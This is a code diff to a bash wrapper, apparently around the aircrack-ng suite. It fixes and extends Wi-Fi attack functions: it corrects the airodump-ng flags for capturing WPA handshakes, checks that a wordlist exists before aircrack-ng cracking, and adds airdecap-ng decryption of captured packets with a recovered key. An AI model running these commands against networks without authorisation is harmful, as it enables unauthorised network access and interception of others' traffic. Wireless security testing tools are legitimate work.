@@ -19,7 +19,7 @@ CHOICES="1 2 3 4 5 6 7 8 9 10 11 12"
 
 menu(){
     if [ "$AUTO" == 1 ]; then return; fi
-    setps; mkmenu "Main Menu" "Attack   - Attack target" "Crack    - Get target key"  "Scan - Manually scan for targets" "Select - Reselect target" "Others   - Various utilities"  "Auto     - Does 1,2,3" "Exit    - Quits"
+    setps; mkmenu "Main Menu" "Attack   - Attack target" "Crack    - Get target key"  "Scan - Manually scan for targets" "Select - Reselect target" "Others   - Various utilities" "Exit    - Quits"
 }
 
 eassideng(){
@@ -117,19 +117,19 @@ Parseforap(){
 
     if [ "$AUTO" != 1 ]; then
         _ "\tDetected Access point list" "\n"
-        _ "#\t\tMAC\t\tCHAN\tSECU\tPOWER\t#CHAR\t\tSSID" "\n"
+        _ "#\t\tMac\t\tChan\tSec\tPwr\t\tSSID" "\n"
     fi
     while IFS=, read MAC FTS LTS CHANNEL SPEED PRIVACY CYPHER AUTH POWER BEACON IV LANIP IDLENGTH ESSID KEY;do
         longueur=${#MAC}
         if [ $longueur -ge 17 ]; then
             i=$(($i+1))
             if [ "$AUTO" != 1  ]; then
-                echo -e " "$i")\t"$MAC"\t"$CHANNEL"\t"$PRIVACY"\t"$POWER"\t"$IDLENGTH"\t"$ESSID
+                echo -e " "$i")\t"$MAC"\t"$CHANNEL"\t"$PRIVACY"\t"$POWER"\t"$ESSID
             fi
             aidlenght=$IDLENGTH
             assid[$i]=$ESSID; achannel[$i]=$CHANNEL; 
             amac[$i]=$MAC; aprivacy[$i]=$PRIVACY;
-            aspeed[$i]=$SPEED
+            aspeed[$i]=$SPEED; apower[$i]=$POWER
         fi
     done < $DUMP_PATH/dump-02.csv
 
@@ -343,7 +343,7 @@ done
     # 1 just capture
     wpahandshake(){
         $clear && hardclean
-        execute "Capturing data on channel: $Host_CHAN"  $AIRODUMP -w $DUMP_PATH/$Host_MAC -b $Host_MAC --channel $Host_CHAN - -a $wifi 
+        execute "Capturing data on channel: $Host_CHAN"  $AIRODUMP -w $DUMP_PATH/$Host_MAC --bssid $Host_MAC --channel $Host_CHAN -a $wifi 
     }
 
     # 2 Use tkiptun-ng
@@ -408,7 +408,9 @@ selectcracking(){
                 read -p "Select option: " foo
 
                 case $foo in
-                    1)  execute "Cracking WPA" crack $AIRCRACK -a 2 -b $Host_MAC -0 -s $DUMP_PATH/$Host_MAC-01.cap -w $WORDLIST  ; $clear;;
+                    1)  if [ ! -e $WORDLIST ]; then echo "Sorry, you cant crack wpa without a dictionary on $WORDLIST"; sleep 3; else
+                        execute "Cracking WPA" crack $AIRCRACK -a 2 -b $Host_MAC -0 -s $DUMP_PATH/$Host_MAC-01.cap -w $WORDLIST  ; $clear; fi ;;
+
                     2)  $clear; read -p "Enter Database location [$db_location]" db_location;
                         execute "Cracking WPA with pmk database" crack  $AIRCRACK -b $Host_MAC -s $DUMP_PATH/$Host_MAC-01.cap -r $db_location;;
 	    	        * ) echo "`gettext 'Unknown response. Try again'`" ;;
@@ -491,8 +493,8 @@ deauthfake(){
 # This is for others  (7)  option
 
 decrypt(){
-# TODO decrypt packages.
-    echo "Error: Not yet implemented"; sleep 3 && $clear
+    $AIRDECAP $DUMP_PATH/$Host_MAC.cap -w "`cat $DUMP_PATH/$Host_MAC.key`"
+    echo "Decrypted packages to $DUMP_PATH/$Host_MAC.cap-dec.cap"
 }
 
 optionmenu(){
